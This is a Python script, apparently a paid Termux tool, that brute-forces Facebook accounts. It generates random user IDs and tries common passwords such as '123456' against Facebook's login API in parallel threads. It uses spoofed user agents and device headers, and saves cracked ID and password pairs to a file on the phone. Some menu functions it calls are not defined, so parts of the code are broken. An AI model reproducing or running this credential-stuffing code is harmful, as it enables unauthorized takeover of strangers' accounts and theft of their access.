#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
from time import localtime as lt
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('pip install httpx')
        os.system('python ULTRA.py')
except:pass
#__________________[ date ]__________________#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Airtel'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Grameenphone"
                        sim_id+=fbcr
        else:
                fbcr = 'Airtel'
                sim_id+=fbcr
except:
        fbcr = "Robi"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = []
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; =(💚)-ULTRA-MAX-(💚)=\x07')
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
#__________________[ M1 ]__________________#
def HOP_M1():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/EMA;FBBV/204637380;FBAV/454.1.0.44.57;FBDV/Huawei Mate Xs;FBSV/12;FBCX/notifications_push_client_sync_graphql;FBDM/{density=2.0};]"
        return ua
#__________________[ M2 ]__________________#
def HOP_M2():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/EMA;FBBV/204637380;FBAV/454.1.0.44.57;FBDV/Huawei Mate Xs;FBSV/12;FBCX/notifications_push_client_sync_graphql;FBDM/{density=2.0};]"
        return ua
#__________________[ M3 ]__________________#
def HOP_M3():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/EMA;FBBV/204637380;FBAV/454.1.0.44.57;FBDV/Huawei Mate Xs;FBSV/12;FBCX/notifications_push_client_sync_graphql;FBDM/{density=2.0};]"
        return ua
#-----------------------[ UA-CODE ]-----------------------#
#old ua def[👇]
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#-------------------// APPROVAL \\---------------------#
import os,httpx
sexkey = "ULTRA~("+str(os.getuid())+"=(POWER)="+str(os.getuid())+")~MAX"
def approval():
    sexkey = "ULTRA~("+str(os.getuid())+"=(POWER)="+str(os.getuid())+")~MAX"
    ress=httpx.get("https://github.com/ALAMIN-XD/Approval.txt/blob/main/Approval.txt").text
    if sexkey in ress:
        menu()
    else:
        print("\x1b[38;5;244m KEY IS NOT APPROVED")
        os.system("clear")
        print(logo)
        print("\x1b[38;5;46m < !!...FAST APROVE YOUR KEY...!! > ")
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
        input(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
        time.sleep(2)
        tks = sexkey
        os.system('xdg-open https://wa.me/+8801915935712')
#__________________| LOGO |__________________#
logo=(f"""


 _______    ______   _______   _______  __      __ 
|       \  /      \ |       \ |       \|  \    /  \
| $$$$$$$\|  $$$$$$\| $$$$$$$\| $$$$$$$\\$$\  /  $$
| $$__/ $$| $$__| $$| $$__/ $$| $$__/ $$ \$$\/  $$ 
| $$    $$| $$    $$| $$    $$| $$    $$  \$$  $$  
| $$$$$$$\| $$$$$$$$| $$$$$$$ | $$$$$$$    \$$$$   
| $$__/ $$| $$  | $$| $$      | $$         | $$    
| $$    $$| $$  | $$| $$      | $$         | $$    
 \$$$$$$$  \$$   \$$ \$$       \$$          \$$    
                                                                    
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : BAPPY VAU
\033[1;32m  GITHUB    : BAPPY KING
\033[1;32m  FACEBOOK  : BAPPY VAU
\033[1;32m  TOOL NAME : FILE × RANDOM × OLD
\033[1;32m  TOOL TYPE : PAID
\033[1;32m  VERSION   : 4.0
\033[1;32m  STATUS    : WIFI+DATA
\033[1;32m---------------------------------------------------------
\x1b[1;97m\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m KEY ━\x1b[38;5;244m➤ \x1b[38;5;81m{sexkey}      \x1b[1;97m
\x1b[1;97m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\033[1;37m""")
#-----------------------[ OLD-CODE ]-----------------------#
def _old_():
       user=[]
       clear()
       print(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()
       limit=input(f"\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
       clear()
       print(f'\x1b[38;5;244m(\x1b[1;97m1\x1b[38;5;244m) \x1b[38;5;46mMETHOD \x1b[38;5;244m(\x1b[38;5;46m2009-2014\x1b[38;5;244m) \x1b[38;5;46m')
       linex()
       ask=input(f"\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
       if ask in["1"]:
          star="10000"
          for i in range(int(limit)):
              data=str(random.choice(range(1000000000,9999999999)))
              user.append(data)
       else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
       with tred(max_workers=40) as crack_submit:
           clear()
           print(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m–\x1b[38;5;46m➤{A} {limit} \x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m–\x1b[38;5;46m➤ {A}M{ask}')
           print(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()
           for mal in user:
              uid=star+mal
              crack_submit.submit(login,uid)
    
loop=0
oks=[]
cps=[]

def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m➤\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": windows(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\x1b[38;5;244m(\x1b[38;5;244mULTRA-OK\x1b[38;5;244m)\x1b[38;5;244m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/ULTRA-OLD.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:              
                print(f"\r\x1b[38;5;244m(\x1b[38;5;46mULTRA-OK\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/ULTRA-OLD.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):            
                print(f"\r\x1b[38;5;244m(\x1b[38;5;46mULTRA-OK\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}")
                open("/sdcard/ULTRA-OLD.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
#__________________| MAIN |__________________#
def menu():
        try:
                        clear()
                        #print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m EXIT TOOL')
                        print('\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m EXIT TOOL')
                        linex()
                        xd=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : /sdcard/ULTRA.txt ');linex()
                                file = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)');linex()
                                mthd=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
                                try:
                                    clear()
                                    ps_limit = int(input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PASSWORD LIMIT : '))
                                except:
                                    ps_limit =1
                                clear()
                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ');linex()
                                for i in range(ps_limit):
                                    plist.append(input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m–\x1b[38;5;46m➤{A} '))
                                linex()
                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
                                print(f'\x1b[38;5;244m[\x1b[1;97m✘\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ');linex()
                                clear()
                                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT ➤ \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')
                                linex()
                                cx=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m–\x1b[38;5;46m➤{A} '+total_ids+f' \x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PASS \x1b[38;5;244m–\x1b[38;5;46m➤{A} {ps_limit}')
                                        print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
                                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
                                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
                                input(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                randm()
                        elif xd in ['3','03']:
                                _old_()
                        elif xd in ['0','05']:
                                exit(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m EXIT DONE ')
                        else:
                                exit(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'\x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m NO INTERNET CONNECTION...')
                exit()
#__________________| END |__________________#
try: 
    _old_()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
    print(e)